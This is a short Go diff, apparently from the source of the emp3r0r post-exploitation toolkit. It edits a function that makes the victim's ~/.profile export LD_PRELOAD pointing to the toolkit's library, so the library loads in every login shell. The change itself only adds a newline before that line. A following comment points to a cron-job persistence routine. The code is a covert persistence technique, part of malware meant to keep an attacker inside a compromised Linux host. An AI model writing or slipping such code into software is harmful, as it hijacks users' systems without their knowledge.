@@ -180,8 +180,7 @@ func ldPreload() error {
 		log.Print(err)
 		return err
 	}
-	return AppendToFile(u.HomeDir+"/.profile", "export LD_PRELOAD="+Libemp3r0rFile)
-
+	return AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+Libemp3r0rFile)
 }
 
 // AddCronJob add a cron job without terminal
